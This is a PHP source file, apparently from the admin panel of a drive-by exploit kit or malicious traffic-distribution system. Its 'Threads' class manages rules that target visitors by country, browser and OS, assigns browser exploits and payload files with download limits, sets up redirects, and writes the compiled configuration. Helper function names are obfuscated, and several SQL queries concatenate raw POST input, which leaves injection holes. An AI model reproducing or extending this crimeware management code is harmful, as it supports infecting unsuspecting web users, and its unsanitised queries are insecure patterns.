<?php 

class Threads
{
    public static $fileName = "threadData.php";

    public static function write($var)
    {
        $str = "";
        if( is_array($var) ) 
        {
            $str .= "array(";
            $arr = array(  );
            foreach( $var as $key => $val ) 
            {
                $keyStr = $key;
                if( !is_numeric($key) ) 
                {
                    $keyStr = "" . "'" . $key . "'";
                }

                $arr[] = $keyStr . " => " . self::write($val);
            }
            $str .= implode(",", $arr);
            $str .= ")";
            return $str;
        }
        else
        {
            return "" . "'" . $var . "'";
        }

    }

    public static function realSave()
    {
        ThreadsData::load();
        $res = array( "Threads" => array(  ), "IP" => array( array(  ), array(  ) ) );
        foreach( ThreadsData::$data as &$thread ) 
        {
            if( !$thread["Deleted"] ) 
            {
                unset($thread["Icon"]);
                unset($thread["Title"]);
                unset($thread["Deleted"]);
                $rs = array(  );
                foreach( $thread["Rules"] as &$rule ) 
                {
                    unset($rule["ThreadID"]);
                    unset($rule["Title"]);
                    unset($rule["Countries"]);
                    unset($rule["Oses"]);
                    unset($rule["Browsers"]);
                    unset($rule["Files"]);
                    unset($rule["Exploits"]);
                    unset($rule["Redirects"]);
                    unset($rule["Sort"]);
                    unset($rule["countryCount"]);
                    unset($rule["browserCount"]);
                    unset($rule["osCount"]);
                    unset($rule["exploitCount"]);
                    unset($rule["filesCount"]);
                    unset($rule["redirectCount"]);
                    if( $rule["Active"] ) 
                    {
                        $rs[] =& $rule;
                    }

                }
                $thread["Rules"] = $rs;
                $res["Threads"][] = $thread;
            }

        }
        $list = db::select("select Type,Title from IP order by Title asc");
        foreach( $list as $l ) 
        {
            $res["IP"][$l["Type"]][] = $l["Title"];
        }
        $configFile = Config::get("LibDir") . "/" . self::$fileName;
        $str = "<?php \$threadData = ";
        $str .= self::write($res);
        $str .= ";?>";
        file_put_contents($configFile, $str);
    }

    public static function reorder()
    {
        foreach( $_POST as $threadId => $val ) 
        {
            $arr = explode(",", $val);
            foreach( $arr as $sort => $ruleId ) 
            {
                db::update($ruleId, array( "Sort" => $sort ), "Rules");
            }
        }
        self::realsave();
    }

    public static function renameFile($oldName, $newName)
    {
        foreach( ThreadsData::$data as &$arr ) 
        {
            foreach( $arr[1] as &$data ) 
            {
                if( isset($data["files"][$oldName]) ) 
                {
                    $data["files"][$newName] = $data["files"][$oldName];
                    unset($data["files"][$oldName]);
                }

            }
        }
        self::realsave();
    }

    public static function addThread($text)
    {
        $url = md5(time());
        $threadID = db::insert(array( "Title" => _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($text), "Url" => $url ), "Threads");
        $copyID = intval($_POST["copyThreadID"]);
        if( $copyID != 0 ) 
        {
            $rules = db::select("select * from Rules where ThreadID = " . $copyID);
            foreach( $rules as &$r ) 
            {
                $rID = $r["ID"];
                unset($r["ID"]);
                $r["ThreadID"] = $threadID;
                $newRuleID = db::insert($r, "Rules");
                $res = db::select("select * from FilesInRules where RuleID = " . $rID);
                foreach( $res as &$t ) 
                {
                    $t["RuleID"] = $newRuleID;
                    db::insert($t, "FilesInRules");
                }
                $res = db::select("select * from Redirects where RuleID = " . $rID);
                foreach( $res as &$t ) 
                {
                    unset($t["ID"]);
                    $t["RuleID"] = $newRuleID;
                    $res = db::insert($t, "Redirects");
                    $dir = Config::get("FilesDir") . "/red" . $res;
                    mkdir($dir, 511);
                    file_put_contents($dir . "/index.php", "<?php header(\"HTTP/1.0 404 Not Found\");?>");
                    $fileName = $dir . "/" . $t["FileLimit"];
                    fclose(fopen($fileName, "w"));
                }
            }
        }
        else
        {
            $ruleID = db::insert(array( "Title" => "default", "ThreadID" => $threadID, "Sort" => 0, "Exploits" => implode(",", array_keys(Browser::$exploits)) ), "Rules");
            echo "<script>Threads.edit(" . $ruleID . ", true);</script>";
        }

        self::realsave();
    }

    public static function editThread($lastId, $text)
    {
        db::update($lastId, array( "Title" => _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($text) ), "Threads");
        self::realsave();
    }

    public static function delThread($threadId)
    {
        db::update($threadId, array( "Deleted" => 1 ), "Threads");
        $rules = db::select("select ID from Rules where ThreadID = " . $threadId);
        $ids = array(  );
        foreach( $rules as $rule ) 
        {
            $ids[] = $rule["ID"];
        }
        db::query("delete from FilesInRules where RuleID in (" . implode(",", $ids) . ")");
        $redirects = db::select("select ID from Redirects where RuleID in (" . implode(",", $ids) . ")");
        foreach( $redirects as $r ) 
        {
            _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_(Config::get("FilesDir") . "/red" . $r["ID"]);
        }
        db::query("delete from Redirects where RuleID in (" . implode(",", $ids) . ")");
        self::realsave();
    }

    public static function delRule($threadId, $ruleId)
    {
        db::deletebyid($ruleId, "Rules");
        db::query("delete from FilesInRules where RuleID = " . $ruleId);
        $redirects = db::select("select ID from Redirects where RuleID = " . $ruleId);
        foreach( $redirects as $r ) 
        {
            _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_(Config::get("FilesDir") . "/red" . $r["ID"]);
        }
        db::query("delete from Redirects where RuleID = " . $ruleId);
        self::realsave();
    }

    public static function save()
    {
        $ruleID = 0;
        if( isset($_POST["ruleID"]) ) 
        {
            $ruleID = intval($_POST["ruleID"]);
            $threadID = db::selectone("ThreadID", "Rules", "ID = " . $ruleID);
        }
        else
        {
            $threadID = $_POST["threadID"];
            db::query("update Rules set Sort = Sort + 1 where ThreadID = " . $threadID);
            $ruleID = db::insert(array( "ThreadID" => $threadID, "Sort" => 0 ), "Rules");
        }

        $row = array(  );
        if( isset($_POST["threadTitle"]) ) 
        {
            $text = $_POST["threadTitle"];
            $row["Title"] = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($text);
        }

        $row["TrafficType"] = $_POST["trafficType"];
        $row["Countries"] = $_POST["countries"];
        $row["Browsers"] = $_POST["browsers"];
        $row["Oses"] = $_POST["os"];
        $row["Exploits"] = "";
        if( isset($_POST["isRedirect"]) ) 
        {
            $row["isRedirect"] = intval($_POST["isRedirect"]);
        }
        else
        {
            $row["isRedirect"] = 0;
        }

        if( $row["isRedirect"] == 0 ) 
        {
            $res = db::select("select ID from Redirects where RuleID = " . intval($ruleID));
            foreach( $res as $r ) 
            {
                _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_(Config::get("FilesDir") . "/red" . $r["ID"]);
            }
            db::query("delete from Redirects where RuleID = " . intval($ruleID));
            $row["Exploits"] = $_POST["exploits"];
            if( isset($_POST["files"]) ) 
            {
                $res = db::select("select FileID from FilesInRules where RuleID = " . intval($ruleID));
                $allFiles = array(  );
                foreach( $res as $r ) 
                {
                    $allFiles[$r["FileID"]] = 1;
                }
                $k = 0;
                foreach( $_POST["files"] as $fileID => $limit ) 
                {
                    $res = db::select("select Sort from FilesInRules where (FileID = " . intval($fileID) . ") and (RuleID = " . intval($ruleID) . ")");
                    if( $res == null ) 
                    {
                        db::insert(array( "FileID" => intval($fileID), "RuleID" => intval($ruleID), "Sort" => $k ), "FilesInRules");
                    }
                    else
                    {
                        db::query("update FilesInRules set Sort = " . $k . " where (FileID = " . intval($fileID) . ") and (RuleID = " . intval($ruleID) . ")");
                        unset($allFiles[$fileID]);
                    }

                    $k++;
                }
                if( 0 < count($allFiles) ) 
                {
                    $ids = array_keys($allFiles);
                    db::query("delete from FilesInRules where (RuleID = " . intval($ruleID) . ") and (FileID in (" . implode(",", $ids) . "))");
                }

            }

        }
        else
        {
            db::query("delete from FilesInRules where RuleID = " . intval($ruleID));
            $arr = array(  );
            if( isset($_POST["redirectLimit"]) ) 
            {
                $k = 0;
                $res = db::select("select ID from Redirects where RuleID = " . intval($ruleID));
                $allReds = array(  );
                foreach( $res as $r ) 
                {
                    $allReds[$r["ID"]] = 1;
                }
                foreach( $_POST["redirectLimit"] as $id => $limit ) 
                {
                    $limit = (intval($limit) != 0 ? intval($limit) : 0 - 1);
                    $url = $_POST["redirectTitle"][$id];
                    $url = _obfuscated_0D1A27275C5B1A0C391939052F053C0A372B11341B2B22_($url);
                    $res = $_POST["redirectID"][$id];
                    if( $res == 0 ) 
                    {
                        $res = db::insert(array( "Title" => $url, "FileLimit" => $limit, "Sort" => $k, "RuleID" => intval($ruleID) ), "Redirects");
                        $dir = Config::get("FilesDir") . "/red" . $res;
                        mkdir($dir, 511);
                        file_put_contents($dir . "/index.php", "<?php header(\"HTTP/1.0 404 Not Found\");?>");
                        $fileName = $dir . "/" . $limit;
                        fclose(fopen($fileName, "w"));
                    }
                    else
                    {
                        $curLimit = Threads::findredirect($res);
                        $limit2 = db::selectone("FileLimit", "Redirects", "ID = " . $res);
                        if( $limit != 0 - 1 ) 
                        {
                            if( $limit != $limit2 ) 
                            {
                                if( $limit2 != 0 - 1 ) 
                                {
                                    $curLimit += $limit - $limit2;
                                    if( $curLimit < 0 ) 
                                    {
                                        $curLimit = 0;
                                    }

                                }
                                else
                                {
                                    $curLimit = $limit - abs($curLimit) + 1;
                                    if( $curLimit < 0 ) 
                                    {
                                        $curLimit = 0;
                                    }

                                }

                            }

                        }
                        else
                        {
                            if( $limit != $limit2 ) 
                            {
                                $loaded = $limit2 - $curLimit;
                                $curLimit = 0 - 1 - $loaded;
                            }

                        }

                        $dir = Config::get("FilesDir") . "/red" . $res;
                        _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_($dir);
                        mkdir($dir, 511);
                        file_put_contents($dir . "/index.php", "<?php header(\"HTTP/1.0 404 Not Found\");?>");
                        $fileName = $dir . "/" . $limit;
                        fclose(fopen($fileName, "w"));
                        db::update($res, array( "FileLimit" => $limit, "Sort" => $k ), "Redirects");
                        unset($allReds[$res]);
                    }

                    $k++;
                }
                if( 0 < count($allReds) ) 
                {
                    $ids = array_keys($allReds);
                    db::query("delete from Redirects where ID in (" . implode(",", $ids) . ")");
                    foreach( $ids as $i ) 
                    {
                        _obfuscated_0D2C221E3B070F0F2B0D0437082C04383B3226221C0801_(Config::get("FilesDir") . "/red" . $i);
                    }
                }

            }

        }

        db::update($ruleID, $row, "Rules");
        self::realsave();
    }

    public static function getFullData()
    {
        $data =& ThreadsData::$data;
        if( $data == null ) 
        {
            $data = array(  );
        }

        foreach( $data as &$thread ) 
        {
            $rules =& $thread["Rules"];
            foreach( $rules as &$t ) 
            {
                $uid = $t["ID"];
                $t["editUrl"] = "Threads.edit(" . $uid . ", " . (($t["Title"] == "default" ? "true" : "false")) . ")";
            }
        }
        return $data;
    }

    public static function findRedirect($fileID)
    {
        $file = ".";
        if( $handle = opendir(Config::get("FilesDir") . "/red" . $fileID) ) 
        {
            while( $file == "." || $file == ".." || strpos($file, ".php") !== false ) 
            {
                $file = readdir($handle);
            }
            return $file;
        }

        return null;
    }

    public static function findRedirectName($fileID)
    {
        return $fileID;
    }

    public static function findFile($fileID)
    {
        $file = ".";
        if( $handle = opendir(Config::get("FilesDir") . "/dir" . $fileID) ) 
        {
            while( $file == "." || $file == ".." || strpos($file, ".php") !== false ) 
            {
                $file = readdir($handle);
            }
            return $file;
        }

        return null;
    }

    public static function findFileName($fileID)
    {
        return $fileID;
    }

}


